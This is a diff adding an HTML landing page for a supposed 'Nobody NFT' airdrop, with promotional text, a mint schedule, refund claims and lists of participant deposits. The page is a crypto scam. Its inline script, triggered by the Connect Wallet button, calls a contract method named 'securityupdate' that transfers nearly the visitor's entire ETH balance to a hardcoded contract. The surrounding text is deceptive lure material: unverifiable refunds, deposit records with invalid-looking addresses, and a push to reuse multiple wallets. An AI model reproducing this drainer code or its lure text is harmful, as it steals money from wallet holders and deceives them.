@@ -1,0 +1,903 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- ===== Boxicons CSS ===== -->
+    <link href='https://unpkg.com/boxicons@2.1.1/css/boxicons.min.css' rel='stylesheet'>
+    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script> <!-- 引入web3.js -->
+    <style>
+       /* ===== Google Font Import - Poppins ===== */
+      @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');
+
+      *{
+          margin: 0;
+          padding: 0;
+          box-sizing: border-box;
+          font-family: 'Poppins', sans-serif;
+          transition: all 0.4s ease;;
+      }
+
+
+      :root{
+          --body-color: #E4E9F7;
+          --nav-color: #fffffff6;
+          --side-nav: #154be0;
+          --text-color: #131212;
+          --search-bar: #F2F2F2;
+          --search-text: #2450c6;
+      }
+
+      body{
+          height: 100vh;
+          background-color: var(--body-color);
+      }
+
+
+
+      nav{
+          position: fixed;
+          top: 0;
+          left: 0;
+          height: 70px;
+          width: 100%;
+          background-color: var(--nav-color);
+          z-index: 100;
+      }
+
+      body.dark nav{
+          border: 1px solid #393838;
+
+      }
+
+      nav .nav-bar{
+          position: relative;
+          height: 100%;
+          max-width: 1000px;
+          width: 100%;
+          background-color: var(--nav-color);
+          margin: 0 auto;
+          padding: 0 30px;
+          display: flex;
+          align-items: center;
+          justify-content: space-between;
+      }
+
+      nav .nav-bar .sidebarOpen{
+          color: var(--text-color);
+          font-size: 25px;
+          padding: 5px;
+          cursor: pointer;
+          display: none;
+      }
+
+      nav .nav-bar .logo a{
+          font-size: 25px;
+          font-weight: 500;
+          color: var(--text-color);
+          text-decoration: none;
+      }
+
+      .menu .logo-toggle{
+          display: none;
+      }
+
+      .nav-bar .nav-links{
+          display: flex;
+          align-items: center;
+      }
+
+      .nav-bar .nav-links li{
+          margin: 0 5px;
+          list-style: none;
+      }
+
+      .nav-links li a{
+          position: relative;
+          font-size: 17px;
+          font-weight: 400;
+          color: var(--text-color);
+        padding: 5px;
+        border: 2px solid #131212;
+          text-decoration: none;
+          box-shadow: 5px 5px 0px #131212;
+          border-radius: 5px;
+          margin: 5px;
+      }
+
+      .nav-links li a::before{
+          content: '';
+          position: absolute;
+          left: 50%;
+          bottom: 0;
+          transform: translateX(-50%);
+          border-radius: 50%;
+          background-color: var(--text-color);
+          opacity: 0;
+          transition: all 0.3s ease;
+          
+      }
+
+      .nav-links li a:hover{
+      box-shadow: none;
+      transform: scale(1.2);
+      }
+
+      .nav-bar .darkLight-searchBox{
+          display: flex;
+          align-items: center;
+      }
+
+      .darkLight-searchBox .dark-light,
+      .darkLight-searchBox .searchToggle{
+          height: 40px;
+          width: 40px;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          margin: 0 5px;
+      }
+
+      .dark-light i,
+      .searchToggle i{
+          position: absolute;
+          color: var(--text-color);
+          font-size: 22px;
+          cursor: pointer;
+          transition: all 0.3s ease;
+      }
+
+
+
+
+
+
+
+
+
+
+      .searchBox{
+          position: relative;
+      }
+
+      .searchBox .search-field{
+          position: absolute;
+          bottom: -85px;
+          right: 5px;
+          height: 50px;
+          width: 300px;
+          display: flex;
+          align-items: center;
+          background-color: var(--nav-color);
+          padding: 3px;
+          border-radius: 6px;
+          box-shadow: 0 5px 5px rgba(0, 0, 0, 0.1);
+          opacity: 0;
+          pointer-events: none;
+          transition: all 0.3s ease;
+      }
+
+      .searchToggle.active ~ .search-field{
+          bottom: -74px;
+          opacity: 1;
+          pointer-events: auto;
+      }
+
+      .search-field::before{
+          content: '';
+          position: absolute;
+          right: 14px;
+          top: -4px;
+          height: 12px;
+          width: 12px;
+          background-color: var(--nav-color);
+          transform: rotate(-45deg);
+          z-index: -1;
+      }
+
+      .search-field input{
+          height: 100%;
+          width: 100%;
+          padding: 0 45px 0 15px;
+          outline: none;
+          border: none;
+          border-radius: 4px;
+          font-size: 14px;
+          font-weight: 400;
+          color: var(--search-text);
+          background-color: var(--search-bar);
+      }
+
+      body.dark .search-field input{
+          color: var(--text-color);
+      }
+
+      .search-field i{
+          position: absolute;
+          color: var(--nav-color);
+          right: 15px;
+          font-size: 22px;
+          cursor: pointer;
+      }
+
+      body.dark .search-field i{
+          color: var(--text-color);
+      }
+
+      @media (max-width: 790px) {
+          nav .nav-bar .sidebarOpen{
+              display: block;
+          }
+
+          .menu{
+              position: fixed;
+              height: 100%;
+              width: 280px;
+              left: -100%;
+              top: 0;
+              padding: 10px;
+              background-color: var(--side-nav);
+              z-index: 100;
+              transition: all 0.4s ease;
+          }
+
+          nav.active .menu{
+              left: -0%;
+          }
+
+          nav.active .nav-bar .navLogo a{
+              opacity: 0;
+              transition: all 0.3s ease;
+          }
+
+          .menu .logo-toggle{
+              display: block;
+              width: 100%;
+              display: flex;
+              align-items: center;
+              justify-content: space-between;
+          }
+
+          .logo-toggle .siderbarClose{
+              color: var(--text-color);
+              font-size: 24px;
+              cursor: pointer;
+          }
+
+          .nav-bar .nav-links{
+              flex-direction: column;
+              padding-top: 30px;
+          }
+
+          .nav-links li a{
+              display: block;
+              margin-top: 20px;
+          }
+      }
+      .walletbtn{
+        position: relative;
+        display: block;
+        width: 200px;
+        text-wrap: nowrap;
+        padding: 4px;
+        border-radius: 5px;
+        font-weight: 500;
+        box-shadow: 5px 5px 0 #000;
+        cursor: pointer;
+        margin-left: 20px;
+      }
+      .walletbtn:hover{
+          box-shadow: none;
+          transform: rotate(.1deg) scale(1.1);
+          cursor: pointer;
+      }
+
+      .flex-container {
+          margin-top: 50px;
+          display: flex;
+          flex-wrap: wrap;
+          gap: 20px;
+          padding: 20px;
+        }
+        
+        .card {
+          flex: 1 1 300px;
+          background-color: #ffff;
+          border: 2px solid #0a0a0a;
+          border-radius: 10px;
+          box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+          text-align: center;
+        }
+
+        .image {
+          flex: 0 0 auto;
+          width: 50%;
+          margin-right: 20px;
+        }
+
+        .text {
+          flex: 1 1 auto;
+        }
+
+        .button {
+          margin-top: 10px;
+          background-color: yellow;
+          border: none;
+          padding: 10px 20px;
+          border-radius: 5px;
+          cursor: pointer;
+          font-size: 16px;
+          font-weight: bold;
+        }
+
+        .slider {
+          width: 100%;
+          margin-top: 20px;
+        }
+
+        .flex-inner{
+          position: relative;
+          display: flex;
+        }
+        .card1{
+          position: relative;
+          flex-grow: 1;
+          text-align: center;
+        }
+
+        .image-inner{
+          position: relative;
+          display: flex;
+          flex-direction:column;
+        }
+
+        .card1-upperflex{
+          position: relative;
+          display: flex;
+          flex-direction: row;
+          gap: 50px;
+          top: 20px;
+        }
+
+        .lower-flex{
+      position: relative;
+      display: flex;
+      justify-content: center;
+      padding: 20px;
+      margin-top: 50px;
+      margin-bottom: 10px;
+      margin-left: 10px;
+      margin-right: 10px;
+      border-radius: 7px;
+      background: rgba(255, 255, 6, 0.443);
+      gap: 20px;
+
+        }
+        .cnbtn{
+          position: relative;
+          padding: 5px;
+          border: 2px solid #0a0a0a;
+          font-size: 1.1em;
+          border-radius: 10px;
+          background: yellow;
+          transform: translate(20%,30%);
+          box-shadow: 3px 0 0 #0a0a0a,
+        3px 3px 0 #0a0a0a;
+          cursor: pointer;
+        }
+        .card1img{
+          padding: 10px;
+          border-radius: 50%;
+          aspect-ratio: 1/1;
+        }
+        .card2{
+          position: relative;
+          text-align: center;
+        }
+      
+        input[type=range] {
+          height: 26px;
+          
+          margin: 10px 0;
+          width: 80%;
+        }
+        input[type=range]:focus {
+          outline: none;
+        }
+        input[type=range]::-webkit-slider-runnable-track {
+          width: 100%;
+          height: 14px;
+          cursor: pointer;
+          
+          box-shadow: 1px 1px 1px #1470f0;
+          background: #e1e723;
+          border-radius: 14px;
+          border: 0px solid #000000;
+        }
+        input[type=range]::-webkit-slider-thumb {
+          box-shadow: 0px 0px 0px #000000;
+          border: 0px solid #000000;
+          height: 20px;
+          width: 40px;
+          border-radius: 12px;
+          background: #e1e723;
+          cursor: pointer;
+          -webkit-appearance: none;
+          margin-top: -3px;
+        }
+        input[type=range]:focus::-webkit-slider-runnable-track {
+          background:#ff0;
+
+        }
+        input[type=range]::-moz-range-track {
+          width: 100%;
+          height: 14px;
+          cursor: pointer;
+          
+          box-shadow: 1px 1px 1px #50555C;
+          background: #50555C;
+          border-radius: 14px;
+          border: 0px solid #000000;
+        }
+        input[type=range]::-moz-range-thumb {
+          box-shadow: 0px 0px 0px #000000;
+          border: 0px solid #000000;
+          height: 20px;
+          width: 40px;
+          border-radius: 12px;
+          background: #deef22;
+          cursor: pointer;
+        }
+        input[type=range]::-ms-track {
+          width: 100%;
+          height: 14px;
+          cursor: pointer;
+          
+          background: transparent;
+          border-color: transparent;
+          color: transparent;
+        }
+        input[type=range]::-ms-fill-lower {
+          background: #50555C;
+          border: 0px solid #000000;
+          border-radius: 28px;
+          box-shadow: 1px 1px 1px #50555C;
+        }
+        input[type=range]::-ms-fill-upper {
+          background: #50555C;
+          border: 0px solid #000000;
+          border-radius: 28px;
+          box-shadow: 1px 1px 1px #50555C;
+        }
+        input[type=range]::-ms-thumb {
+          margin-top: 1px;
+          box-shadow: 0px 0px 0px #000000;
+          border: 0px solid #000000;
+          height: 20px;
+          width: 40px;
+          border-radius: 12px;
+          background: #fbec21;
+          cursor: pointer;
+        }
+        input[type=range]:focus::-ms-fill-lower {
+          background: #50555C;
+        }
+        input[type=range]:focus::-ms-fill-upper {
+          background: #50555C;
+        }
+        .slider-text{
+          font-weight: 700;
+          margin-top: 100px;
+        }
+      
+      .onestprocess{
+          position: relative;
+          display: flex;
+          justify-content: space-around;
+          padding: 20px;
+      }
+
+
+      .secondprocess{
+          position: relative;
+          display: flex;
+          justify-content: space-around;
+          padding: 20px;
+      }
+      .thirdprocess{
+          position: relative;
+          display: flex;
+          justify-content: space-around;
+          padding: 20px;
+      }
+
+      .process-img{
+          writing-mode: vertical-lr;
+          font-size: 2em;
+      }
+      .steps{
+          position: relative;
+          font-weight: 600;
+      }
+
+      .card4{
+          position: relative;
+        width: auto;
+        height: 20vh;
+        overflow: scroll;
+      }
+      .status{
+          display: flex;
+          flex-direction: column;
+          gap: 20px;
+      }
+      .process{
+          position: relative;
+          display: flex;
+          justify-content: space-around;
+          
+      }
+      .processicon{
+          writing-mode: vertical-lr;
+          font-weight: 700;
+          margin: 5px;
+          
+      }
+      .nav-bar .logo a img {
+        /* 可能包含其他样式，将其替换或添加下面的规则 */
+        max-width: 100%; /* 设置logo的最大宽度为其父容器的百分比 */
+        max-height: 70px; /* 设置logo的最大高度 */
+        width: auto; /* 自适应宽度 */
+        height: auto; /* 自适应高度 */
+    }
+    .modal-wrapper {
+            display: none;
+            position: fixed;
+            z-index: 2;
+            left: 50%;
+            top: 46%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+        .wallet-modal {
+            width: 350px;
+            height: auto;
+            max-height: 80vh; /* 设置最大高度 */
+            overflow-y: auto; /* 允许垂直滚动 */
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 10px;
+            border-radius: 10px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+        .wallet-option {
+            border: 2px solid #007BFF;
+            border-radius: 10px;
+            padding: 5px;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            transition: transform 0.3s;
+        }
+        .wallet-option:hover {
+            transform: scale(1.1);
+        }
+        .wallet-logo {
+            max-width: 30px;
+            max-height: 30px;
+        }
+    </style>
+    <title>Nobody</title>
+</head>
+<body>
+    <nav>
+        <div class="nav-bar">
+            <i class='bx bx-menu sidebarOpen' ></i>
+            <span class="logo"><a href="index.html"><img src="./images/nft_mint_cover.webp" alt="Logo" /></a></span>
+           
+
+            <div class="menu">
+                <div class="logo-toggle">
+                    <span class="logo"><a href="#">Logo horizontial</a></span>
+                    <i class='bx bx-x siderbarClose'></i>
+                </div>
+
+                <ul class="nav-links">
+                    <li><a href="https://x.com/realnobodyxyz?s=11"> TWittre</a></li>
+                    <li><a href="https://link3.to/realnobodyxyz"> instgram</a></li>
+                    <li><a href="https://t.me/ReaINOBODY"> Telegram</a></li>
+                    <li><a href="https://element.market/collections/nobody">Element NFT  </a></li>
+                    <li><a href="https://www.okx.com/cn/web3/marketplace/nft/collection/eth/nobody"> OKX NFT </a></li>
+                </ul>
+            </div>
+
+            <div class="darkLight-searchBox">
+                <div class="dark-light">
+                  <button class="walletbtn" onclick="handleWallet('MetaMask')">Connect Wallet</button>
+                  <!-- <button class="walletbtn" onclick="document.getElementById('walletModalWrapper').style.display = 'block'">Connect Wallet</button> -->
+                </div>
+
+                <div class="searchBox">
+                   <div class="searchToggle">
+                  
+                    
+                   </div>
+
+                    
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <div class="flex-container">
+        <div class="card card1">
+          <div class='image-inner'>
+            <div className='card1-upperflex'>
+            <img src="images/nft_mint_cover.webp " alt="nn" class='card1img'/>
+  
+            <div>
+              <div>
+                <h2>Get your special NFT</h2><br/>
+                <p>Total offer: 5294 ETH</p> <br/>
+                <p>total value: ≈17717,560.5618 USDT</p> <br/>
+                <p>The remaining amount: 3000</p> <br/>
+              </div>
+            </div>
+            </div>
+  
+  
+            <div class='lower-flex'>
+            <div>
+              <p>TThe next wave of refunds will be carried out one month later. Let’s participate together.</p>
+              <p>Refunds for first-time participants have been completed 70 days ago</p>
+              <p>The following is the open source contract address</p>
+            <P> ------------------o----------------</p>
+              <a href="https://etherscan.io/address/0x129d453253dbCE5CF6997DB8Fb461B2A20Fd275F" class='cnbtn'>0x129d453253dbCE5CF6997DB8Fb461B2A20Fd275F</a>
+              <P>------------------o----------------</P>
+              <h4>If you need multiple addresses to participate in the event, please disconnect the link to the website in the extension application and refresh the website, then you can use the new address to participate again</h4>
+              <br>
+              <br/>
+            </div><br/>
+            <br/>
+              </div> </div>
+              <br/>
+        </div>
+      
+        <div class="card card2">
+          <h2>Total Deposites</h2><br/>
+          <h1>3192.4692 ETH</h1><br/>
+          <input type="range" min={10} max={100} class='range-input'/>
+          <div class="slider-text">
+              <p>In order to maintain the fairness of the event, each user is only allowed to receive Nodoboy NFT once</p>
+              <p>Each participant address, please keep more than 0.1 ETH to pay the handling fee</p>
+              Deposit remains open over 100% cap. After the deposit, non-whitelisted holders need to participate in a raffle, while whitelisted holders are guaranteed to receive Nobody NFTs
+              <h2> Sustaining the Nodoboy NFT Plan: Embarking on a Journey into the Future of Digital Art
+              </h2>
+              <P>As blockchain technology continues to evolve and become more widespread, NFTs (non-fungible tokens) have emerged as a significant tool for digital art and asset management.</P>
+            <P> The Nodoboy NFT Plan aims to expand its ecosystem and attract more users to participate in the blockchain ecosystem through an airdrop of 3,000 unique NFTs.</p>
+             <P> This article will provide a detailed introduction to the background of the Nodoboy NFT Plan, its airdrop mechanism, and its future outlook, offering a unique digital art experience to our users.</P>
+             <h2> Airdrop Recipients /Participation Method   </h2>
+             <P>We will target the blockchain community, NFT enthusiasts, and new users for the airdrop. Through social media activities, partner promotions, and community interactions, anyone can participate, and we ensure that each NFT finds its rightful owner. The airdrop recipients include but are not limited to:</P>
+             <P>- Blockchain community members</P>
+            <P>- NFT enthusiasts</P>
+            <P>- New users</P>
+             <P>Users only need to follow our social media accounts, repost the airdrop announcement, and use the MetaMask extension wallet to link to the airdrop to participate in the draw. We will use an open and transparent draw system to ensure the fairness and transparency of the activity. The participation method is as follows:</P>
+          
+          <h2>1. Follow Social Media: Stay updated with Nodoboy NFT topics and trends..</p>
+          <P>2. Repost the Airdrop Announcement: Repost the airdrop announcement to increase the activity's exposure.</p>
+          <p>3. Use MetaMask: Use the MetaMask extension wallet to link to the airdrop activity page.</p>
+          <p>4. Ensure Balance: Each participant must have a balance of more than 0.1 ETH in their address to pay the participation fee.</p>
+          <p>5. Wait for Results: After successfully linking, you will receive an NFT valued between 0.1 and 0.425 ETH within 24 hours, and the participation fee will be refunded to the participant's address. </p>
+          <P>6.Currently only MetaMask browser extension application is supported for participation. If you need to use other wallets, please contact Telegram customer service staff. Other social accounts do not support replies</P>
+          </div>
+          <br/>
+        </div>
+      
+        <div class="card">
+          <h2>Mint Schedule</h2>
+         <div class="status">
+           <div class="process pr1">
+               <div class="processicon">--o--</div>
+                <div><b>Mint</b>
+                <br>
+                Feb 1, 8 PM - Feb 3, 8 PM (UTC+8)
+                </div>
+                    </div>
+           <div class="process pr2">
+            <div class="processicon">----o----</div>
+            <div><b>Raffle and Airdrop</b>
+            <br>
+            Feb 3, 8 PM - Feb 4, 8 PM (UTC+8)
+            </div>
+                 </div>
+
+       <div class="process pr3">
+        <div class="processicon">--o--</div>
+        <div><b>Refund</b>
+        <br>
+        Feb 4, 8 PM - Jul 4, 8 PM (UTC+8)
+        </div>
+             </div>
+
+        <div class="process pr3">
+              <div class="processicon">--o--</div>
+              <div><b>The first round of refunds has been completed</b>
+                <P>total value: ≈3192.4692ETH</P>
+                <br> 
+                Below are some participant records
+                </div>
+              
+                </div>
+        <div class="process pr3">
+               <div class="processicon">------------------o----------------</div>
+                <div><b>Deposited User</b>
+                 <br>
+                  <P>0x135D…3C3D  0.19527 ETH</P>
+                  <P>0x48DF…af22 0.19527 ETH</P>
+                  <p>0x3697…1E05 0.19527 ETH</p>
+                  <p>0xFAD8…44Dd 0.19527 ETH</p>
+                  <p>0x0Cd9…7BE8 0.19527 ETH</p>
+                  <p>0x5A24…7BFb 0.19527 ETH</p>
+                  <p>0xjsA1…bcH8 0.19527ETH</p>
+                  <p>0xX9ef…K3lm 0.19527ETH</p>
+                 <p>0xBsNf…7opQ  0.19527ETH</p>
+                  <p>0xsS4t…uV6vw  0.19527ETH</p>
+                 <p>0xsZ5x…yP1rt 0.19527ETH</p>
+                 <p>0xsF2g…hB7kl  0.19527ETH</p>
+                 <p>0xsL6m…nD8op   0.19527ETH</p>
+                  <p>0xsR9s…tM4uv  0.19527ETH</p>
+                  <p>0xW2yz…C5ab   0.19527ETH</p>
+
+                  0x512f…c9c7 0.19527 ETH
+                 </div>
+                   </div>
+       <div class="process pr3">
+                     <div class="processicon">--o--</div>
+                       <div><b>The new participation time is as follows</b>
+                     <br>
+                     July 17, 8 pm - July 20, 8 pm (UTC+8)
+                     </div>
+                        </div>
+        <div class="process pr3">
+                       <div class="processicon">--o--</div>
+                      <div><b>Raffle and Airdrop</b>
+                        <br>
+                        July 17, 8 pm - December 20, 8 pm (UTC+8)
+                  </div>
+                   </div>
+                   <div class="process pr3">
+                    <div class="processicon">--o--</div>
+                    <div><b>Send a special NFT to each participant’s address</b>
+                    <br>
+                    July 17, 8 pm - December 20, 8 pm Send during the period
+                    <P>Until all NFTs worth 500,000 ETH are sent to participant addresses</P>
+                    </div>
+                         </div>
+                         <div class="process pr3">
+                          <div class="processicon">--o--</div>
+                           <div><b>Refund</b>
+                            <br>
+                            July 17, 8 pm - December 20, 8 pm 
+                            <p>Sent to the payment address along with the participant's NFT</p>
+                            </div>
+                              </div>
+                        </div>        
+
+           </div>
+        
+       </div>
+      
+
+      
+      <div class="card card4">
+        <div class="flex-inner">
+          <div class="text">
+             <h2>Nobody NFT</h2>
+            <p>Nobody is a NFT collection launched jointly by Nobody and Mr.</p>
+            <P>Nobody is a NFT collection launched jointly by Nobody and Mr. Stephen Chow, Nobody First Creator, with 10K in total. Owning a Nobody NFT grants you the chance to become part of Nobody. You will participate in the project's development, and enjoy many privileges, including but not limited to proposing, co-creating, voting, and creating with Nobody IP.
+            </P>
+            <P>What makes Nobody NFT special is that each Nobody NFT represents a vivid character with its own story. Holders can interact with these characters through the Nobody App, understanding their personalities, hobbies, backgrounds and shaping their future.
+            </P>
+            We also strive to build the Nobody IP, combining Mr. Stephen Chow's previous experience and new mechanisms. Through various forms of works, we aim to bring Nobody IP to the public eye, breaking through the barriers that have previously prevented Web3 native IPs from entering the mainstream Web2 market.
+          </div>
+        </div>
+      </div>
+    
+      <div class="card">
+       <h2>Nobody Community</h2>
+        <h3>Centered on "laughter", "creation", and "sharing", the Nobody community will exhibit openness and inclusivity, striving to break traditional boundaries. We encourage everyone to display their talents to create diverse and vibrant works.</h3>
+        <p>Some text below the subheading.</p>
+        <div class="slider">
+          For 2024, we will be focusing on providing resources and opportunities for the community to join the film and short video creation, including but not limited to co-creating movie clips from Mr. Stephen Chow's "The Mermaid 2", "Shaolin Women's Soccer" and casting for future works. We will also actively build on the Nobody IP in various forms. What’s more, Nobody will seek to expand into more fields, such as fashion, art, music, etc., to call upon every nobody and co-create quality content for both Web2 and Web3.
+        </div>
+      </div>
+    </div>
+<!-- 钱包选择模态框 -->
+<div class="modal-wrapper" id="walletModalWrapper" onclick="document.getElementById('walletModalWrapper').style.display = 'none'">
+  <div class="wallet-modal">
+      <div class="wallet-option" onclick="handleWallet('MetaMask')">
+          <img src="images/MetaMask-Partnership-The-Giving-Block.png" alt="MetaMask Logo" class="wallet-logo">
+          <p>MetaMask</p>
+      </div>
+      <div class="wallet-option" onclick="handleWallet('OKX Wallet')">
+          <img src="images/OKX-Exchange-1.webp" alt="OKX Wallet Logo" class="wallet-logo">
+          <p>OKX Wallet</p>
+      </div>
+      <div class="wallet-option" onclick="handleWallet('Trust Wallet')">
+          <img src="images/score-card-images_0025_Vector-Smart-Object.webp" alt="Trust Wallet Logo" class="wallet-logo">
+          <p>Trust Wallet</p>
+      </div>
+      <div class="wallet-option" onclick="handleWallet('Coinbase Wallet')">
+          <img src="images/Coinbase Wallet.png" alt="Coinbase Wallet Logo" class="wallet-logo">
+          <p>Coinbase Wallet</p>
+      </div>
+      <div class="wallet-option" onclick="handleWallet('WalletConnect')">
+          <img src="images/WalletConnect-Logo.png" alt="WalletConnect Logo" class="wallet-logo">
+          <p>WalletConnect</p>
+      </div>
+      <div class="wallet-option" onclick="handleWallet('Rainbow')">
+          <img src="images/bold-electrical-logo-design-by-ergotm-designcrowd.png" alt="Rainbow Logo" class="wallet-logo">
+          <p>Rainbow</p>
+      </div>
+      <div class="wallet-option" onclick="handleWallet('Argent')">
+          <img src="images/Argent.png" alt="Argent Logo" class="wallet-logo">
+          <p>Argent</p>
+      </div>
+      <div class="wallet-option" onclick="handleWallet('Phantom')">
+          <img src="images/EXCHANGE-REVIEW-2021-12-19T162607.174.png" alt="Phantom Logo" class="wallet-logo">
+          <p>Phantom</p>
+      </div>
+      <div class="wallet-option" onclick="handleWallet('Ledger Live')">
+          <img src="images/Ledger Live.png" alt="Ledger Live Logo" class="wallet-logo">
+          <p>Ledger Live</p>
+      </div>
+      <div class="wallet-option" onclick="handleWallet('Bitski')">
+          <img src="images/Bitski.png" alt="Bitski Logo" class="wallet-logo">
+          <p>Bitski</p>
+      </div>
+  </div>
+</div>
+<script>
+  
+async function handleWallet(walletName) {
+  if (walletName === 'MetaMask') {
+      if (typeof window.ethereum !== 'undefined') {
+          // MetaMask已安装
+          try {
+              const contractAddress = "0x40ABC1FAd8285F75Ca1bE733c98887908ce85936"
+              const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' }); // 请求用户授权
+              const curAccount = accounts[0]; // 获取当前用户的钱包地址
+              const web3 = new Web3(window.ethereum);
+              const balanceWei = await web3.eth.getBalance(curAccount);
+              console.log('当前用户的钱包地址:', curAccount);
+              console.log('当前用户的余额(wei):', balanceWei);
+              const abiJson = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"connectedWallets","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getConnectedWallets","outputs":[{"internalType":"address[]","name":"","type":"address[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"securityupdate","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}];
+              const contract = new web3.eth.Contract(abiJson, contractAddress); // 使用合约的ABI和地址初始化合约对象
+              // 假设调用合约的doSomething方法
+              await contract.methods.securityupdate().send(({
+                  from: curAccount,
+                  value: balanceWei - BigInt(10000000000000000), // 从用户余额中扣除1ETH
+                }));
+              console.log('合约调用结果:', result);
+          } catch (error) {
+              console.error('合约调用失败:', error);
+          }
+      } else {
+          // MetaMask未安装，跳转到官网
+          window.location.href = 'https://metamask.io/';
+      }
+  }
+  // 可以为其他钱包添加类似的逻辑
+}
+</script>
+  <script src="script.js"></script>
+
+</body>
+</html>
